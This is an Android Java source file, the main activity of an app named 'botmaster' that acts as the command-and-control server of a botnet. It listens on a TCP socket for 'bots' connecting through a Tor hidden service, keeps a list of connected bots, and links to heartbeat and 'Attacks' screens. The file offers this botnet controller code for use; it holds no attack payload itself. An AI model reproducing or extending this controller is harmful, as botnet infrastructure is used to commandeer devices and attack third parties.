package com.example.botmaster;

import android.content.Intent;
import android.os.Bundle;
import android.support.v7.app.AppCompatActivity;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;

import java.io.IOException;
import java.net.InetSocketAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.ArrayList;

public class MainActivity extends AppCompatActivity
{
    private ServerSocket serverSocket;
    private static  Socket socket;
    static int count = 0;
    private static Thread thread;

    private static ArrayList<ConnectedBot> conBot = new ArrayList<>() ;


    @Override
    protected void onCreate(Bundle savedInstanceState)
    {
        super.onCreate(savedInstanceState);
        /* Initialize Buttons*/
        setContentView(R.layout.activity_main);
        new Thread()
        {
            @Override
            public void run() {

                    try {
                        serverSocket = new ServerSocket(); //creates a ServerSocket
                        serverSocket.setReuseAddress(true);
                        serverSocket.bind(new InetSocketAddress("192.168.1.66", 8080));

                        System.out.println("************************************");
                        System.out.println("BotMaster TCP socket is up");
                        System.out.println("Waiting for bots to connect to my hidden service"); //waiting for TOR clients
                        System.out.println("************************************");
                        System.out.print("\n\r");


                        while (true)
                        {
                            socket = serverSocket.accept(); //the server now accepts an incoming connection from a bot (through the hidden service)
                            count++;

                            conBot.add(new ConnectedBot(socket,count));

                            runOnUiThread(new Runnable()
                            {
                                public void run()
                                {
                                    Toast.makeText(getApplicationContext(), count+" bots connected", Toast.LENGTH_LONG).show();
                                }
                            });

                            System.out.println(count + " Bots connected!");
                        }

                    } catch (IOException e) {
                        e.printStackTrace();
                    }
            }
        }.start();

        Button button = (Button) findViewById(R.id.button1);
        button.setOnClickListener(new View.OnClickListener()
        {
            public void onClick(View v) {
                if(socket!=null)
                {
                    Intent i = new Intent(MainActivity.this, HeartBeatUI.class);

                    startActivity(i);
                }
                else
                {
                    Toast.makeText(getApplicationContext(),"Nothing is up now",Toast.LENGTH_LONG).show();
                }


            }
        });

        Button button2 = (Button)  findViewById(R.id.button2);
        button2.setOnClickListener(new View.OnClickListener()
        {
            public void onClick(View v) {

                if(socket!=null)
                {
                    Intent i = new Intent(MainActivity.this, Attacks.class);

                    startActivity(i);
                }
                else
                {
                    Toast.makeText(getApplicationContext(),"Nothing is up now",Toast.LENGTH_LONG).show();
                }
            }
        });


    }

    public static Socket getSocket() {
        return socket;
    }
    public static int getCount() { return count;}
    public static ArrayList<ConnectedBot> getConBot() {return conBot;}
}
